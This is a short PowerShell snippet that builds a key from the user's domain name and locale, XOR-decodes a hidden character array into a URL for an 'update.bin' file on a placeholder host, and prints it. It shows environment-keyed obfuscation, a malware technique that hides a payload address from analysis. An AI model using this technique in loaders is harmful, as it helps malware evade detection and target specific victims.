$domainName, $localeName = $env:USERDOMAIN, $PSCulture
$url = ((65,93,93,89,90,19,6,6,76,81,72,68,89,69,76,7,70,91,78,6,72,89,64,6,95,24,6,92,89,77,72,93,76,7,75,64,71 | ForEach-Object { [char]($_ -bxor ([int]([char]$domainName[0]) -bxor [int]([char]$localeName[0]))) }) -join '')
Write-Output $url
